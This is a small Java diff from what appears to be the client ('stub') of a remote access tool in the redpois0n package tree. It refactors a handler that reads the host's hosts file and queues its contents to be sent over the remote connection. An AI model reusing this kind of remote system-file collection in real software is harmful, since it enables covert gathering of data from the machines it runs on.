@@ -6,7 +6,7 @@ import java.io.InputStreamReader;
 
 import com.redpois0n.Connection;
 import com.redpois0n.common.OperatingSystem;
-import com.redpois0n.packets.outgoing.Header;
+import com.redpois0n.stub.packets.outgoing.Packet38HostFile;
 
 
 public class PacketGETHOSTFI extends AbstractIncomingPacket {
@@ -22,8 +22,9 @@ public class PacketGETHOSTFI extends AbstractIncomingPacket {
 			while ((line = reader.readLine()) != null) {
 				tosend += line + "\n";
 			}
-			Connection.addToSendQueue(new PacketBuilder(Header.HOST_FILE, tosend));
 			reader.close();
+			
+			Connection.addToSendQueue(new Packet38HostFile(tosend));
 		}
 	}
 
